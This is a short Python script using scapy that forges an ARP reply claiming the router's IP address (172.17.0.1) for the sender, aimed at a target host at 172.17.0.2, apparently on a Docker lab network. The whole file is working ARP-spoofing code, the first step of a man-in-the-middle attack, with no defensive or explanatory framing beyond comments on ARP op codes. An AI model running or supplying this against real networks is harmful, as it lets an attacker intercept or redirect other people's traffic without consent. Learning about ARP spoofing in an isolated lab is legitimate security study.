import scapy.all as scapy

target_ip = "172.17.0.2"
target_mac = "02:42:ac:11:00:02"
router_ip = "172.17.0.1"

packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
#print(scapy.ls(scapy.ARP())) # op = 1 -> ARP request, op = 2 -> ARP response
#print(packet.show())
scapy.send(packet)